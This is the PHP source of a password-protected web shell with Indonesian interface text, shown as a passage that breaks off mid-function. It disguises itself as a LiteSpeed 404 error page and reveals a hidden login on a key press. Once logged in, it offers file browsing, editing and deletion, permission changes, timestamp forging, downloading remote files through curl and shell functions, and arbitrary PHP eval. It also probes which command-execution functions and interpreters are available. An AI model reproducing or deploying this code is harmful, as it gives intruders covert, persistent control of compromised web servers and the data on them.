<?php
ini_set('session.save_path', sys_get_temp_dir());
ini_set('session.save_handler', 'files');

session_start();
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
$session_timeout = 30 * 60;
$stored_hashed_password = '$2a$12$X2RwmfyB/I1Swskd70P3XezmT.vt7VB1PWSRuBCOugBX7I6utLaWi';
$current_ip = $_SERVER['REMOTE_ADDR'];

if (!isset($_SESSION['authenticated']) || !isset($_SESSION['ip']) || $_SESSION['ip'] !== $current_ip || (time() - $_SESSION['last_activity']) > $session_timeout) {
    if (isset($_POST['pass'])) {
        $input_password = $_POST['pass'];
        if (password_verify($input_password, $stored_hashed_password)) {
            $_SESSION['authenticated'] = true;
            $_SESSION['ip'] = $current_ip;
            $_SESSION['last_activity'] = time();
            session_regenerate_id(true);
            header("Location: " . htmlspecialchars($_SERVER['PHP_SELF']));
            exit();
        } else {
            show_login_page("Kata sandi tidak valid.");
        }
    } else {
        show_login_page();
    }
} else {
    $_SESSION['last_activity'] = time();
}
function show_login_page($message = "") {
?>
    <!DOCTYPE html>
    <html lang="en">
    <html style="height: 100%;">

    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>404 Not Found </title>
        <style>
            @media (prefers-color-scheme:dark) {
                body {
                    background-color: #000 !important
                }
            }
        </style>
    </head>

    <body oncontextmenu="return false">

        <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
            <div style="height:auto; min-height:100%; ">
                <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
                    <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
                    <h2 style="margin-top:20px;font-size: 30px;">Not Found</h2>
                    <p>The resource requested could not be found on this server!</p>
                </div>
            </div>
            <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
                <br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
            </div>
            <script>
                document.onkeydown = function(e) {
                    if (e.ctrlKey && e.keyCode == 88) {
                        document.writeln('<form action="" method="post"><input type="password" name="pass"><input type="submit" name="submit" value="Login"></form></div>');
                    }
                    if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85)) {
                        return false;
                    }
                };

                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                });
            </script>
            <?php if ($message): ?>
            <p class="error-message"><?php echo htmlspecialchars($message); ?></p>
        <?php endif; ?>
        </body>
    </body>
</html>
<?php
    exit;
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
    
}
$host = $_SERVER['HTTP_HOST'];
$additional_title = "K!ngW";


function generateDirectoryLinks($dir){
    $dir = str_replace("\\", "/", $dir);
    $dirs = explode("/", $dir);
    $links = 'CWD : ';

    foreach ($dirs as $key => $value) {
        if ($value == "" && $key == 0) {

            $links .= '';
            continue;
        }
        $links .= '<a href="?dir=';
        for ($i = 0; $i <= $key; $i++) {
            $links .= "$dirs[$i]";
            if ($key !== $i) $links .= "/";
        }

        $links .= '">' . $value . '</a>/';
    }

    return $links;
}
function showFiles($dir)
{
    $scan = @scandir($dir);
    if ($scan === false) {
        echo "<tr><td colspan='4'>Error: Unable to scan directory.</td></tr>";
        return;
    }
    $folders = array();
    $files = array();
    foreach ($scan as $item) {
        if ($item == '.' || $item == '..') continue;

        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    foreach ($folders as $item) {
        $path = $dir . '/' . $item;
        $size = '--';
        $permission = substr(sprintf('%o', fileperms($path)), -4);
        $datetime = displayFileDatetime($path);
        $action = generateFolderActions($dir, $path);

        echo "<tr>
                <td><i class='fas fa-folder folder-icon'></i> <a href=\"?dir=" . urlencode($path) . "\">" . $item . "</a></td>
                <td><center>$size</center></td>
                <td><center><a href=\"?dir=" . urlencode($dir) . "&change_Permission=" . urlencode($path) . "\">" . htmlspecialchars($permission) . "</a></center></td>
                <td><center><a href=\"?dir=" . urlencode($dir) . "&change_datetime=" . urlencode($path) . "\">" . htmlspecialchars($datetime) . "</a></center></td>
                <td style='text-align: center; text-transform: uppercase;'>" . htmlspecialchars(get_current_user_alternative()) . " / " . htmlspecialchars(get_current_group()) . "</td>
                <td><center>$action</center></td>
              </tr>";
    }

    foreach ($files as $item) {
        $path = $dir . '/' . $item;
        $size = formatSize(@filesize($path));
        $permission = substr(sprintf('%o', fileperms($path)), -4);
        $datetime = displayFileDatetime($path);
        $action = generateFileActions($dir, $path, $item, $permission);


        echo "<tr>
                <td><i class='fas fa-file file-icon'></i> <a href=\"?dir=" . urlencode($dir) . "&open=" . urlencode($path) . "\">" . htmlspecialchars($item) . "</a></center></td>
                <td><center>$size</center></td>
                <td><center><a href=\"?dir=" . urlencode($dir) . "&change_Permission=" . urlencode($path) . "\">" . htmlspecialchars($permission) . "</a></center></td>
                <td><center><a href=\"?dir=" . urlencode($dir) . "&change_datetime=" . urlencode($path) . "\">" . htmlspecialchars($datetime) . "</a></center></td>
                <td style='text-align: center; text-transform: uppercase;'>" . htmlspecialchars(get_current_user_alternative()) . " / " . htmlspecialchars(get_current_group()) . "</td>
                <td><center>$action</center></td>
              </tr>";
    }
}


function displayFileDatetime($filename)
{
    if (file_exists($filename)) {
        $timestamp = filemtime($filename);
        $datetime = date("Y-m-d H:i:s", $timestamp);
        return $datetime;
    } else {
        return "N/A";
    }
}

function uploadFileFromUrl($url, $dir, $retries = 3)
{
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Invalid URL!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        return;
    }

    if (!is_dir($dir) || !is_writable($dir)) {
        echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Invalid or unwritable directory!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        return;
    }

    $fileName = basename(parse_url($url, PHP_URL_PATH));
    $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
    $filePath = rtrim($dir, '/') . '/' . $fileName;

    $attempt = 0;
    $success = false;

    while ($attempt < $retries) {
        // Try using command line tools
        $success = downloadFileWithCommand($url, $filePath);
        if (!$success) {
            $success = downloadFileWithStream($url, $filePath);
        }
        if (!$success) {
            $success = downloadFileWithPhp($url, $filePath);
        }
        if ($success) {
            break;
        }
        $attempt++;
    }

    if ($success) {

        echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'File uploaded form url successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    } else {
        echo" <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Failed to fetch file content from URL after $retries attempts!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    }
}

function downloadFileWithCommand($url, $filePath)
{
    if (function_exists('shell_exec') || function_exists('passthru') || function_exists('system') || function_exists('popen') || function_exists('exec') || function_exists('proc_open')) {
        $command = "curl -s -o " . escapeshellarg($filePath) . " " . escapeshellarg($url);
        $output = executeTerminalurl($command);
        return file_exists($filePath) && filesize($filePath) > 0;
    }
    return false;
}

function downloadFileWithStream($url, $filePath)
{
    $fp = @fopen($filePath, 'wb');
    if ($fp) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $success = curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        return $success && file_exists($filePath) && filesize($filePath) > 0;
    }
    return false;
}

function downloadFileWithPhp($url, $filePath)
{
    if (function_exists('file_get_contents') && function_exists('file_put_contents')) {
        $data = @file_get_contents($url);
        if ($data !== false) {
            return @file_put_contents($filePath, $data) !== false;
        }
    }
    return false;
}

function executeTerminalurl($command) {
    if (function_exists('shell_exec')) {
        return shell_exec($command);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command, $return_var);
        $output = ob_get_clean();
        return $output;
    } elseif (function_exists('system')) {
        ob_start();
        system($command, $return_var);
        $output = ob_get_clean();
        return $output;
    } elseif (function_exists('popen')) {
        $handle = popen($command, 'r');
        $output = '';
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 1024);
            }
            pclose($handle);
        } else {
            $output = "Failed to open process with popen.";
        }
        return $output;
    } elseif (function_exists('exec')) {
        exec($command, $output, $return_var);
        return implode("\n", $output);
    } elseif (function_exists('proc_open')) {
        $process = proc_open($command, [1 => ['pipe', 'w']], $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
            return $output;
        } else {
            return "Failed to execute process with proc_open.";
        }
    } else {
        return "No command execution functions available.";
    }
}

function formatSize($bytes)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

function generateFileActions($dir, $path)
{
    return '<a href="?dir=' . htmlspecialchars($dir) . '&open=' . htmlspecialchars($path) . '" class="button">Edit</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&delete=' . htmlspecialchars($path) . '" class="button4">Delete</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&rename=' . htmlspecialchars($path) . '" class="button1">Rename</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&change_datetime=' . htmlspecialchars($path) . '" class="button2">Datetime</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&change_Permission=' . htmlspecialchars($path) . '" class="button3">Permission</a>';
}

function generateFolderActions($dir, $path)
{
    return '<a href="?dir=' . htmlspecialchars($dir) . '&deletefolder=' . htmlspecialchars($path) . '" class="button4">Delete</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&rename=' . htmlspecialchars($path) . '" class="button1">Rename</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&change_datetime=' . htmlspecialchars($path) . '" class="button2">Datetime</a>
            <a href="?dir=' . htmlspecialchars($dir) . '&change_Permission=' . htmlspecialchars($path) . '" class="button3">Permission</a>';
}

function changePermissions($file_path, $new_permissions)
{

    if (file_exists($file_path)) {

        if (chmod($file_path, $new_permissions)) {
            echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'Permissions successfully changed for $file_path',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";

        } else {
            echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Failed to change permissions for $file_path',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        }
    } else {
        echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'File or directory not found: $file_path',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    }
}

function postpermissions($path)
{
    echo '
    <center><br>
    <div class="execution-box">
    <form method="POST" action="">
        <label for="new_permissions"><h2>| Change Permissions | </h2></label>
        <p>PATH: ' . htmlspecialchars($path) . '</p>
        <input type="text" id="new_permissions" name="new_permissions" placeholder="Enter octal permissions (e.g., 755)" required>
        <button type="submit">Change</button>
        <input type="hidden" name="change_Permission" value="' . htmlspecialchars($path) . '">
    </form>
    <br>
    </div>
    
    </center>';

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['new_permissions'])) {
        $file_to_change = $_POST['change_Permission'];
        $new_permissions = $_POST['new_permissions'];

        if (preg_match('/^[0-7]{3}$/', $new_permissions)) {
            $new_permissions = octdec($new_permissions);

            $change_result = changePermissions($file_to_change, $new_permissions);

        } else {
            echo "<p>Invalid permissions format. Please enter a valid octal number (e.g., 755).</p>";
        }
    }
}

function changeFileDatetime($path, $newDatetime)
{
    $newTimestamp = strtotime($newDatetime);
    if (touch($path, $newTimestamp)) {
        return true;
    } else {
        return false;
    }
}

function displayChangeDatetimeForm($path)
{
    echo '<center><br><div class="execution-box">
    <form method="post" action="">
        <input type="hidden" name="change_datetime" value="' . htmlspecialchars($path) . '">
        <label for="new_datetime"><h2> | Change Modification Date | </h2></label>
        <br>
        <p>PATH: ' . htmlspecialchars($path) . '</p>
        <input type="text" id="new_datetime" name="new_datetime" required>
        <input type="submit" value="Change!">
    </form><br></div></center>';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_datetime'])) {
        $path = $_POST['change_datetime'];
        $newDatetime = $_POST['new_datetime'];

        if (!empty($newDatetime)) {

            $result = changeFileDatetime($path, $newDatetime);

            if ($result) {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'Date changed successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            } else {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Date failed to change!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            }
        } else {
            echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'The change date column cannot be empty!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        }
    }
}
function createFileForm($dir){
    echo "
    <br />
            <style>
                table {
                    display: none;
                }
            </style>
    <br>
    <center>

    <div class='execution-box'>
        <form method='post'>
            <label for='filename'><h2>CREATE FILE</h2></label><br>
            FILE NAME : <input type='text' name='filename' id='filename' placeholder='0xMystogan.php' required><br><br>
            <textarea name='filecontent' id='filecontent' placeholder='MANG EAK ?' rows='100' cols='150' required></textarea>
            <label for='filename'>".$dir."</label>
            <br>
            <button type='submit' name='addfile'><i class='fas fa-play submit-icon'></i> Create</button>
        </form>
        <br>
        <br>
    </div>
    </center>";
}

function renameFile($dir)
{
    if (isset($_GET['rename'])) {
        echo '<br>
        <center>
        <div class="execution-box">
            <form method="post">
                <label for="filename"><h2>RENAME FILE</h2></label><br>
                New Name: <input type="text" name="newname" id="all" value="' . basename($_GET['rename']) . '">
                <input type="submit" name="rename" value="Rename">
            </form>
                <br>
                </div>
                </center>';

        if (isset($_POST['rename'])) {
            $oldname = $_GET['rename'];
            $newname = dirname($oldname) . '/' . $_POST['newname'];
            if (rename($oldname, $newname)) {
                echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'File renamed successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            } else {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Failed to rename file!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            }
        }
    }
}



function deleteFolder($dir)
{
    if (isset($_GET['deletefolder'])) {
        $folderToDelete = urldecode($_GET['deletefolder']);
        if (!is_dir($folderToDelete)) {
            echo "<script>alert('Folder not found or not a valid directory!');</script>";
            exit;
        }

        $files = array_diff(scandir($folderToDelete), array('.', '..'));
        foreach ($files as $file) {
            $path = $folderToDelete . '/' . $file;
            if (is_dir($path)) {
                deleteFolder($path);
            } else {
                unlink($path);
            }
        }

        if (rmdir($folderToDelete)) {
            echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'Folder deleted successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            exit;
        } else {
            echo "  <script>  
                            function showCustomAlert() {
                                Swal.fire({
                                    title: 'Whoops!',
                                    text: 'Failed to delete folder!',
                                    icon: 'error',
                                    confirmButtonText: 'OK',
                                    background: '#2e2e2e',
                                    color: '#ffffff'
                                });
                            }
                            document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            exit;
        }
    }
}

function is_dirEmpty($dir){
    if (!is_readable($dir)) return NULL;
    return (count(scandir($dir)) == 2);
}


function createFile($dir){
    if (isset($_POST['addfile'])) {
        $filename = $_POST['filename'];
        $filecontent = $_POST['filecontent'];
        $filepath = $dir . '/' . $filename;

        if (file_exists($filepath)) {
            echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'File already exists!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        } else {
            if (file_put_contents($filepath, $filecontent) !== false) {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'File created successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            } else {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Failed to create file!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            }
        }
    }
}

function createFolderForm($dir)
{
    echo "<br>
    <div class='execution-box'>
        <form method='post'>
        <label for='createfolder'>Directory Creation</label>
        <br>
            <input type='text' name='okfolder' placeholder='Slot Gacor' id='readfile'>
            <button type='submit' name='addfolder'><i class='fas fa-play submit-icon'></i></button>
        </form>
        </div>";
}
function createFolder($dir)
{
    if (isset($_POST['addfolder'])) {
        $newFolderName = isset($_POST['okfolder']) ? $_POST['okfolder'] : '';
        if (!empty($newFolderName)) {
            $newFolderPath = $dir . '/' . $newFolderName;
            if (mkdir($newFolderPath, 0755)) {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'create folder successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            } else {
                echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Failed to create folder!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            }
        } else {
            echo "<script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Folder name cannot be empty!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        }
    }
}

function deleteFile($dir)
{
    if (isset($_GET['delete'])) {
        $fileToDelete = $_GET['delete'];
        if (unlink($fileToDelete)) {
            echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Delete File',
                                text: 'File deleted successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        } else {
            echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Delete File',
                                text: 'File deleted failed!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        }
    }
}

function editFile($dir)
{
    if (isset($_GET['open'])) {
        $filePath = $_GET['open'];

        if (isset($_POST['edit'])) {
            $content = $_POST['edit'];

            if (file_put_contents($filePath, $content) !== false) {
                echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'File edited successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
            } else {
                echo " <script>
                function showCustomAlert() {
                    Swal.fire({
                        title: 'Whoops!',
                        text: 'Failed to edit file!',
                        icon: 'error',
                        confirmButtonText: 'OK',
                        background: '#2e2e2e',
                        color: '#ffffff'
                    });
                }
                document.addEventListener('DOMContentLoaded', showCustomAlert);
            </script>";
            }
        } else {
            echo '
            <br />
            <style>
                table {
                    display: none;
                }
            </style>
            <center>
            <form method="post">
            <label>Directory : '.$filePath.'</label>
            <br>
                <textarea name="edit" rows="20" cols="200">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>
                <br>
                <button type="submit" name="save"><i class="fas fa-play submit-icon"></i>Save</button>
            </form>
            </center>
            ';
        }
    }
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (isset($_POST['uploadurl'])) {
    $url = $_POST['url'];
    $retries = 3;
    uploadFileFromUrl($url, $dir, $retries);
}

function evalgankform($dir)
{
    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['eval-form'])) {
        echo'<br />
            <style>
                table {
                    display: none;
                }
            </style>';
        echo '<center>';
        echo '<form method="post" action="">';
        echo '<label for="code">Masukkan Kode PHP:</label><br>';
        echo '<textarea id="code" name="code" rows="20" cols="200" required></textarea><br>';
        echo '<input type="submit" name="eval-gank" value="Evaluasi">';
        echo '</form>';
        echo '</center>';
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['eval-gank'])) {
        $code = $_POST['code'];

        echo '<center>';
        echo '<h3>Kode PHP yang dievaluasi:</h3>';
        echo '<textarea rows="20" cols="200" readonly>';
        echo htmlspecialchars($code);
        echo '</textarea>';
        echo '</center>';

        try {
            eval('?>' . $code);
        } catch (ParseError $e) {
            echo "Terjadi kesalahan sintaksis: " . htmlspecialchars($e->getMessage());
        } catch (Throwable $e) {
            echo "Terjadi kesalahan: " . htmlspecialchars($e->getMessage());
        }
    }
}

function get_current_group() {
    // Check if the system is Windows
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return 'NONE';
    }

    // Check if the required POSIX functions exist
    if (!function_exists('posix_getuid') || !function_exists('posix_getpwuid') || !function_exists('posix_getgrgid')) {
        return 'POSIX';
    }

    // Get user information using POSIX functions
    $uid = posix_getuid();
    $user_info = posix_getpwuid($uid);

    if (!$user_info || !isset($user_info['gid'])) {
        return 'NONE';
    }

    // Get group information based on user's GID
    $gid = $user_info['gid'];
    $group_info = posix_getgrgid($gid);

    if (!$group_info || !isset($group_info['name'])) {
        return 'NONE';
    }

    return $group_info['name'];
}


function checkProgram($program)
{
    
    if (function_exists('exec')) {
        $output = [];
        $return_var = 0;
        exec("which $program", $output, $return_var);
        return $return_var === 0;
    } else {
        
    }
    
    return false;
}

function getHDDInfo()
{
    if (function_exists('disk_total_space') && function_exists('disk_free_space')) {
        $disk_total_space = @disk_total_space("/");
        $disk_free_space = @disk_free_space("/");
        $disk_used_space = $disk_total_space - $disk_free_space;

        if ($disk_total_space === false || $disk_free_space === false) {
            return [
                "total" => "Information not available",
                "free" => "Information not available",
                "used" => "Information not available",
            ];
        }

        $total = formatBytes($disk_total_space);
        $free = formatBytes($disk_free_space);
        $used = formatBytes($disk_used_space);

        return [
            "total" => $total,
            "free" => $free,
            "used" => $used,
        ];
    } else {
        return [
            "total" => "Information not available",
            "free" => "Information not available",
            "used" => "Information not available",
        ];
    }
}


function formatBytes($bytes, $precision = 2)
{
    
    $units = ["B", "KB", "MB", "GB", "TB"];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);

    $bytes /= (1 << (10 * $pow));
    $formatted = round($bytes, $precision) . " " . $units[$pow];

    
    return $formatted;
}


function get_current_user_alternative() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return 'Windows User';
    }

    if (function_exists('posix_getuid') && function_exists('posix_getpwuid')) {
        $uid = posix_getuid();
        $user_info = posix_getpwuid($uid);
        if ($user_info && isset($user_info['name'])) {
            return $user_info['name'];
        } else {
            return 'UNKNOWN USER';
        }
    } else {
        return 'POSIX';
    }
}


function displayServerInfo() {
    $server_ip = isset($_SERVER["SERVER_ADDR"]) ? $_SERVER["SERVER_ADDR"] : "Information not available";
    $server_software = isset($_SERVER["SERVER_SOFTWARE"]) ? $_SERVER["SERVER_SOFTWARE"] : "Information not available";
    $php_version = phpversion() ? phpversion() : "Information not available";
    $safe_mode = (ini_get("safe_mode") === "1" || strtolower(ini_get("safe_mode")) === "on") ? "ON" : "OFF";
    $disk_info = getHDDInfo();
    $uname = function_exists('php_uname') ? php_uname() : "Information not available";
    

    $programs = [
        "Perl" => "perl",
        "Python" => "python",
        "Bash" => "bash"
    ];

    echo "<span>Server Info</span>";
    echo "<ul>";
    echo "<li>Server IP: $server_ip</li>";
    echo "<li>Server Software: $server_software</li>";
    echo "<li>PHP Version: $php_version</li>";
    echo "<li>Safe Mode: $safe_mode</li>";
    echo "<li>System Info: $uname</li>";

    // Check if the function exists before calling it
    if (function_exists('get_current_user')) {
        echo "<li>User: " . get_current_user() . "</li>";
    } else {
        echo "<li>User: Information not available</li>";
    }

    echo "<li>Group: " . get_current_group() . "</li>";
    echo "</ul>";

    echo "<span>Disk Space</span>";
    echo "<ul>";
    echo "<li>Total Space: {$disk_info["total"]}</li>";
    echo "<li>Free Space: {$disk_info["free"]}</li>";
    echo "<li>Used Space: {$disk_info["used"]}</li>";
    echo "</ul>";

    $functions_to_check = [
        "exec", "shell_exec", "proc_open", "passthru", "system", "popen", 
        "curl_exec", "curl_multi_exec"
    ];

    $disabled_functions = ini_get("disable_functions") ?: "";
    $disabled_functions_list = array_map("trim", explode(",", $disabled_functions));

    echo "<div class='info-block'>";
    echo "<span>Disabled Functions <span class='toggle-btn' onclick=\"toggleInfo('disabled-functions')\">[Toggle]</span></span>";
    echo "<ul id='disabled-functions' style='display: none;'>";
    foreach ($functions_to_check as $func) {
        $disabled = in_array($func, $disabled_functions_list);
        $status = $disabled ? "OFF" : "ON";
        $color = $disabled ? "red" : "green";
        echo "<li>$func - <span style='color: $color;'>$status</span></li>";
    }
    echo "</ul>";
    echo "</div>";

    $features_to_check = [
        "CURL" => "curl_init",
        "SSH2" => "ssh2_connect",
        "MySQL" => "mysqli_connect"
    ];

    echo "<div class='info-block'>";
    echo "<span>Additional Features <span class='toggle-btn' onclick=\"toggleInfo('additional-features')\">[Toggle]</span></span>";
    echo "<ul id='additional-features' style='display: none;'>";
    foreach ($features_to_check as $feature => $check_func) {
        $available = function_exists($check_func);
        $status = $available ? "ON" : "OFF";
        $color = $available ? "green" : "red";
        echo "<li>$feature : <span style='color: $color;'>$status</span></li>";
    }
    echo "</ul>";
    echo "</div>";

    echo "<span>Available Programs</span>";
    echo "<ul>";
    foreach ($programs as $program_name => $program_command) {
        $available = checkProgram($program_command);
        $status = $available ? "ON" : "OFF";
        $color = $available ? "green" : "red";
        echo "<li>$program_name: <span style='color: $color;'>$status</span></li>";
    }
    echo "</ul>";
}



function dirkentod($dir){
    $dir = str_replace("\\", "/", $dir);
    $dirs = explode("/", $dir);
    $links = '';

    foreach ($dirs as $key => $value) {
        if ($value == "" && $key == 0) {

            $links .= '';
            continue;
        }
        $links .= '<a href="?dir=';
        for ($i = 0; $i <= $key; $i++) {
            $links .= "$dirs[$i]";
            if ($key !== $i) $links .= "/";
        }

        $links .= '">' . $value . '</a>/';
    }

    return $links;
}

function compressFolder($source, $destination) {
    // Create a new ZIP archive
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) {
        die("Cannot open <$destination>\n");
    }

    // Add files to the ZIP archive
    $source = realpath($source);
    if (is_dir($source)) {
